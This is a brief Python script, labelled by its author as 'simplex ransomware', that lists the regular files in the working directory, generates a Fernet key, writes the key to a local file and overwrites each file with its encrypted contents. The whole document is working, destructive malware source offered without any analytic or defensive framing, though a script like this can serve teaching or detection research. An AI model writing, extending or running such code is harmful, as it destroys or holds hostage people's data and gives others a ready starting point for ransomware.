# simplex ransomware with fernet
# by s

#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

print("_____ rnsmx001.py in execution")

# listing dirs

list_dirs = [d for d in os.listdir() if d not in ("rnsmx001.py", "kxx.key", "drnsmax001.py") and os.path.isfile(d)]
print("DIRECTORIES in", os.getcwd())
for d in list_dirs:
    print("\\"+d)


# key generation and storage

k = Fernet.generate_key()
with open("kxx.key", "wb") as kxx:
    kxx.write(k)

# encryption

for d in list_dirs:
    print("..opened \\"+d)
    with open(d, mode='rb') as f:
        content = f.read()
    with open(d, mode='wb') as f:
        f.write(Fernet(k).encrypt(content))
    print("..encrypted \\"+d)




